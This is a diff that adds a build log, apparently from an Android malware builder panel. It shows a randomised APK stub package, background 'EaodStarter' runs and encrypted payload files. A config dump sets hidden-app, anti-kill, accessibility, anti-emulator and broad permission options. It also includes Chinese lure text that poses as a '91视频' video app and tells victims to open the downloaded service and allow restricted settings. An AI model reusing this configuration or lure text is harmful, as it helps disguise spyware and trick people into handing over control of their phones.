@@ -1,0 +1,63 @@
+===============================================================
+ Build Log
+   userid : 1
+   appid  : org.subsystem.muxer.guardian
+   started: 2026-04-27 03:29:16
+   pid    : 40704
+   os     : Linux
+===============================================================
+
+[03:29:16] [INFO] [BUILD_START           ] (+    0.2ms) BuildCustom appname=333 version=4.1.2
+[03:29:16] [INFO] [RANDOMIZE_START       ] (+    0.4ms) master=/www/wwwroot/al.s2e7.my/private/apkstub/apkstub_master  workdir=/www/wwwroot/al.s2e7.my/private/apkstub/apkstub
+[03:29:16] [INFO] [LOCK_WAIT             ] (+    0.5ms) acquiring exclusive lock...
+[03:29:16] [INFO] [LOCK_ACQUIRED         ] (+    0.6ms) after waiting 0s
+[03:29:16] [INFO] [PYTHON_EXEC           ] (+    0.6ms) cmd='python3' '/www/wwwroot/al.s2e7.my/private/tools/randomize_stub.py' --src '/www/wwwroot/al.s2e7.my/private/apkstub/apkstub_master' --dst '/www/wwwroot/al.s2e7.my/private/apkstub/apkstub' --seed 1262779294 --quiet
+[03:29:20] [INFO] [PYTHON_OUT            ] (+ 4101.5ms) {"success": true, "new_pkg": "com.fu7738i9.yte7fkpo", "class_count": 59, "dst": "/www/wwwroot/al.s2e7.my/private/apkstub/apkstub"}
+[03:29:20] [INFO] [RANDOMIZE_DONE        ] (+ 4101.6ms) new_pkg=com.fu7738i9.yte7fkpo classes=59
+[03:29:20] [INFO] [EAODSTARTER_START     ] (+ 4101.7ms) binary=/www/wwwroot/al.s2e7.my/private/EaodStarter
+appid: org.subsystem.muxer.guardian
+userid: 1
+ClientName: 333
+Email: admin@localhost
+MainActivity: empty
+appdir: empty
+UserHost: al.s2e7.my
+use_access: 1
+use_antkill: 1
+use_atoprims: 加载中~请勿操作或锁屏！
+notifytitle:   
+notifymsg: on
+allprims: 1
+blackprims: 1
+Buildtype: C
+appname: 333
+appversion: 4.1.2
+appicopath: ba4509737c197e608559531dcaa20669.png
+appurl: 33
+logintitle: name
+logindis: 允许受限制的设置
+loginbtn: 确定
+lngshort: 91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用
+hiddenapp: 1
+noemulator: /www/wwwroot/al.s2e7.my/user/ui/0b3c1dc185d24ed63e3cc2b383d465c2.png
+installtype: g
+hidetype: f
+use_draw: 0
+open_access: 0
+descr_iption: 无
+diao_type: 1
+Your app is building now , goto: Menu > Dashboard > Apps.
+[03:29:22] [INFO] [EAODSTARTER_BG        ] (+ 6227.4ms) started in background, log will append
+[03:29:23] [INFO] [LOCK_RELEASED         ] (+ 7727.8ms) 
+[03:29:23] [INFO] [BUILD_RETURN          ] (+ 7728.0ms) async path, EaodStarter still running
+Encrypted: 10.bt
+Encrypted: 5.bt
+Encrypted: 3.bt
+Encrypted: 0.bt
+Encrypted: 6.bt
+Encrypted: 9.bt
+Encrypted: 7.bt
+Encrypted: 2.bt
+Encrypted: 4.bt
+Encrypted: 8.bt
+Encrypted: 1.bt
